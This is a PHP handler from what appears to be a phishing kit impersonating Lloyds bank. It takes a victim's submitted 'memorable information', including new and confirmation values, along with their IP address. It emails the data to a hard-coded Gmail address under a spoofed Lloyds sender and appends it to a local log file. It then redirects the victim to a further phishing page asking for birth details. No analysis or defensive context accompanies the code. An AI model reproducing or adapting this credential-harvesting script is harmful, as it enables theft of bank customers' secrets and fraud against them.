<?php
$memo = $_POST['memo'] ; 
$memonew = $_POST['memonew'] ; 
$memonewconfirm = $_POST['memonewconfirm'] ; 
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
 
$to="hfaidhmoukim@gmail.com" ; 
 
$subject = " memorable information Lloyd <3 : from: ".$ip;
$nome=" memo " ; 
	$from="rzlt@Lloyd.uk" ; 
	$from_mail = $nome.'<'.$from.'>';
$headers .= 'From: ' . $from_mail . "\r\n";
$message  = "------------------+ Login Fibank +-----------------\r\n";
$message .= "memorable: ".$memo."\r\n";
$message .= "new memorable:".$memonew." \r\n";
$message .= "confirm".$memonewconfirm."\r\n";
$message .= "---------------+ Host Infos +---------------\r\n";
$message .= "IP Address : ".$ip."\r\n";
$message .= "-----------------+ Created By Jen +------------------\r\n";
mail($to,$subject,$from_mail,$message);
$sajal = fopen("../zarga2.txt", "a");  
fwrite($sajal, $message);
	header('Location: ../birth.html');


?>